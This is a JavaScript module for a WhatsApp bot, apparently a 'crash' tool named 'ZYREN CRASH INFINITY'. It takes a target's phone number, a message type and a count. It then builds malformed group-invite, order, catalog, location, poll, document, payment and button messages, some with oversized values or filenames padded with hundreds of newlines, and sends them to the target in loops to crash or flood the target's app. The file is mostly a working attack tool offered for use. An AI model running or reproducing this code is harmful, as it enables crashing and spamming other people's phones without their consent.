const fs = require("fs");
const { generateWAMessageFromContent, proto, prepareWAMessageMedia } = require('@adiwajshing/baileys')
module.exports = async (zyren, setReply, text, sleep, prefix, ngazap, qotedbug, notif3, notif4, place) => {
try{
const nomer = text.split('|')[0].replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./media/gambarnye/thezyren.jpg') }, { upload: zyren.waUploadToServer })
var groupInvite = generateWAMessageFromContent(nomer, proto.Message.fromObject({
"groupInviteMessage": {
"groupJid": "85296556573-1328272333@g.us",
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": `${ngazap(prefix)}`,
"groupName": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘${ngazap(prefix)}`,
"caption": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘${ngazap(prefix)}`,
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: nomer, quoted: qotedbug })
var order = generateWAMessageFromContent(nomer, proto.Message.fromObject({
"orderMessage": {
"orderId": "594071395007984",
"orderImage": messa.imageMessage,
"itemCount": 100000000000,
"status": "INQUIRY",
"surface": "CATALOG",
"message": `${notif3}`,
"jpegThumbnail":fs.readFileSync('./media/gambarnye/thezyren.jpg'),
"orderTitle": `${notif4}`,
"sellerJid": "6281991410940@s.whatsapp.net",
"token": "AR40+xXRlWKpdJ2ILEqtgoUFd45C8rc1CMYdYG/R2KXrSg==",
"totalAmount1000": "500000000000000",
"totalCurrencyCode": "IDR",
}
}), { userJid: nomer, quoted: qotedbug })
var catalog = generateWAMessageFromContent(nomer, proto.Message.fromObject({
"productMessage": {
"product": {
"productImage": messa.imageMessage,
"productId": "4383282311765462",
"title": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘${ngazap(prefix)}`,
"description": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`,
"currencyCode": "IDR",
"footerText": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`,
"priceAmount1000": "10000000",
"productImageCount": 923456789,
"firstImageId": 1,
"salePriceAmount1000": "10000000",
"retailerId": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘`,
"url": "wa.me/6281991410940"
},
"businessOwnerJid": "6281991410940@s.whatsapp.net",
}
}), { userJid: nomer, quoted: qotedbug })
var liveLocation = generateWAMessageFromContent(nomer, proto.Message.fromObject({
"liveLocationMessage": {
"degreesLatitude": -6.9367014,
"degreesLongitude": 107.7228574,
"caption": `𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘${ngazap(prefix)}`,
"sequenceNumber": "1657237469254001",
"jpegThumbnail": messa.imageMessage,
}
}), { userJid: nomer, quoted: qotedbug })
var pollCreation = generateWAMessageFromContent(nomer, proto.Message.fromObject({
"pollCreationMessage": {
"name": "HALO SAYA BOT NVS",
"options": [
	{
"optionName": "VOTE YUK"
	},
	{
"optionName": "BERANI VOTE GA"
	},
	{
"optionName": "VOTE LAH SEMUA"
	},
	{
"optionName": "BIAR DAPAT WA VIP"
	},
	{
"optionName": "SALAM CREATOR BOT"
	}
],
"selectableOptionsCount": 5
	}
}), { userJid: nomer, quoted: qotedbug })
var document = generateWAMessageFromContent(nomer, proto.Message.fromObject({	
"documentMessage": {
"url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
"mimetype": "",
"title": "𝗕𝗔𝗦𝗘 𝗦𝗜𝗗",
"fileSha256": "47DEQpj8HBSa+/TImW+5JCeuQeRkm5NMpJWZG3hSuFU=",
"pageCount": 0,
"mediaKey": "SkHeALp42Ch7DGb6nuV6p7hxL+V9yjh9s9t3Ox8a72o=",
"fileName": `🍻ิ҈࿆ۣ𝐙𝐘𝐑𝐄𝐍𝐍 𝑪𝑹𝑨𝑺𝑯 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘ꪶ♘ꫂ\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n.${place}.𝗕𝗔𝗦𝗘 𝗦𝗜𝗗`,
"fileEncSha256": "CnBDLUVshNEAmK8C4ShVaI99hh/oFBEZHIeGsL/Q3HY=",
"directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
"mediaKeyTimestamp": "1658703206",
}
}), { userJid: nomer, quoted: qotedbug })
var requestPaymentMessage = generateWAMessageFromContent(nomer, proto.Message.fromObject({
"requestPaymentMessage": {
"currencyCodeIso4217": "USD",
"amount1000": "88890",
"requestPaymentimage": messa.imageMessage,
"requestFrom": `P`,
"noteMessage": {
"extendedTextMessage": {
"text": `${notif3}`,
}
}}}), { userJid: nomer, quoted: qotedbug })
if (text.split("|")[0] && text.split("|")[1] == "invite" && text.split("|")[2]) {
for (let i = 0; i < text.split("|")[2]; i++) {
zyren.relayMessage(nomer, groupInvite.message, { messageId: groupInvite.key.id })
}
setReply(`Berhasil mengirim ${text.split("|")[2]} bug ke ${text.split("|")[0]}`) 
} else if (text.split("|")[0] && text.split("|")[1] == "troli" && text.split("|")[2]) {
for (let i = 0; i < text.split("|")[2]; i++) {
zyren.relayMessage(nomer, order.message, { messageId: order.key.id })
}
setReply(`Berhasil mengirim ${text.split("|")[2]} bug ke ${text.split("|")[0]}`) 
} else if (text.split("|")[0] && text.split("|")[1] == "catalog" && text.split("|")[2]) {
for (let i = 0; i < text.split("|")[2]; i++) {
zyren.relayMessage(nomer, catalog.message, { messageId: catalog.key.id })
}
setReply(`Berhasil mengirim ${text.split("|")[2]} bug ke ${text.split("|")[0]}`) 
} else if (text.split("|")[0] && text.split("|")[1] == "location" && text.split("|")[2]) {
for (let i = 0; i < text.split("|")[2]; i++) {
zyren.relayMessage(num, liveLocation.message, { messageId: liveLocation.key.id })
}
setReply(`Berhasil mengirim ${text.split("|")[2]} bug ke ${text.split("|")[0]}`) 
} else if (text.split("|")[0] && text.split("|")[1] == "poll" && text.split("|")[2]) {
for (let i = 0; i < text.split("|")[2]; i++) {
zyren.relayMessage(nomer, pollCreation.message, { messageId: pollCreation.key.id })
}
setReply(`Berhasil mengirim ${text.split("|")[2]} bug ke ${text.split("|")[0]}`) 
} else if (text.split("|")[0] && text.split("|")[1] == "document" && text.split("|")[2]) {
for (let i = 0; i < text.split("|")[2]; i++) {
zyren.relayMessage(nomer, document.message, { messageId: document.key.id })
}
setReply(`Berhasil mengirim ${text.split("|")[2]} bug ke ${text.split("|")[0]}`) 
} else if (text.split("|")[0] && text.split("|")[1] == "payment" && text.split("|")[2]) {
for (let i = 0; i < text.split("|")[2]; i++) {
zyren.relayMessage(nomer, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
}
setReply(`Berhasil mengirim ${text.split("|")[2]} bug ke ${text.split("|")[0]}`) 
} else if (text.split("|")[0] && text.split("|")[1] == "audio" && text.split("|")[2]) {
for (let i = 0; i < text.split("|")[2]; i++) {
zyren.sendMessage(nomer, { audio: fs.readFileSync("./basetzy/virtex/🍷꙰͜͡𝐏𝐚𝐤𝐓𝐳𝐲💸̷⃨⃛.mp3"), mimetype: 'audio/mp4'}, { quoted: qotedbug })
}
setReply(`Berhasil mengirim ${text.split("|")[2]} bug ke ${text.split("|")[0]}`) 
} else if (text.split("|")[0] && text.split("|")[1] == "sticker" && text.split("|")[2]) {
for (let i = 0; i < text.split("|")[2]; i++) {
zyren.sendMessage(nomer, { sticker: fs.readFileSync('./media/gambarnye/SuksesCok1.webp') }, { quoted: qotedbug })
}
setReply(`Berhasil mengirim ${text.split("|")[2]} bug ke ${text.split("|")[0]}`) 
} else if (text.split("|")[0] && text.split("|")[1] == "image" && text.split("|")[2]) {
for (let i = 0; i < text.split("|")[2]; i++) {
zyren.sendMessage(nomer, { image: fs.readFileSync('./media/gambarnye/thezyren.jpg') }, { quoted: qotedbug })
}
setReply(`Berhasil mengirim ${text.split("|")[2]} bug ke ${text.split("|")[0]}`) 
} else if (text.split("|")[0] && text.split("|")[1] == "video" && text.split("|")[2]) {
for (let i = 0; i < text.split("|")[2]; i++) {
zyren.sendMessage(nomer, { video: { url: "https://e.top4top.io/m_2532xauz60.mp4"}, mimetype: 'video/mp4'}, { quoted: qotedbug })
}
setReply(`Berhasil mengirim ${text.split("|")[2]} bug ke ${text.split("|")[0]}`) 
} else if (text.split("|")[0] && text.split("|")[1] == "button" && text.split("|")[2]) {
for (let i = 0; i < text.split("|")[2]; i++) {
zyren.sendMessage(nomer, {
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
}
setReply(`Berhasil mengirim ${text.split("|")[2]} bug ke ${text.split("|")[0]}`) 
} else if (text.split("|")[0] && text.split("|")[1] == "spam" && text.split("|")[2]) {
for (let i = 0; i < text.split("|")[2]; i++) {
zyren.relayMessage(nomer, groupInvite.message, { messageId: groupInvite.key.id })
await sleep(1000)
zyren.relayMessage(nomer, order.message, { messageId: order.key.id })
await sleep(1000)
zyren.relayMessage(nomer, catalog.message, { messageId: catalog.key.id })
await sleep(1000)
zyren.relayMessage(num, liveLocation.message, { messageId: liveLocation.key.id })
await sleep(1000)
zyren.relayMessage(nomer, pollCreation.message, { messageId: pollCreation.key.id })
await sleep(1000)
zyren.relayMessage(nomer, document.message, { messageId: document.key.id })
await sleep(1000)
zyren.relayMessage(nomer, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
await sleep(1000)
zyren.sendMessage(nomer, { audio: fs.readFileSync("./basetzy/virtex/🍷꙰͜͡𝐏𝐚𝐤𝐓𝐳𝐲💸̷⃨⃛.mp3"), mimetype: 'audio/mp4'}, { quoted: qotedbug })
await sleep(1000)
zyren.sendMessage(nomer, { sticker: fs.readFileSync('./media/stickernye/istigfar.webp') }, { quoted: qotedbug })
await sleep(1000)
zyren.sendMessage(nomer, { image: fs.readFileSync('./media/gambarnye/thezyren.jpg') }, { quoted: qotedbug })
await sleep(1000)
zyren.sendMessage(nomer, { video: { url: "https://e.top4top.io/m_2532xauz60.mp4"}, mimetype: 'video/mp4'}, { quoted: qotedbug })
await sleep(1000)
zyren.sendMessage(nomer, {
text: '', 
templateButtons: [
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ callButton: { displayText: `P`, phoneNumber: ``}},
{ urlButton: { displayText: `P`, url: `https://www.whatsapp.com/otp/copy/`}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
{ quickReplyButton: { displayText: `P`, id: ``}},
]})
}
setReply(`Berhasil mengirim ${text.split("|")[2]} bug ke ${text.split("|")[0]}`) 
}
} catch (e) {
console.log(e)
}
}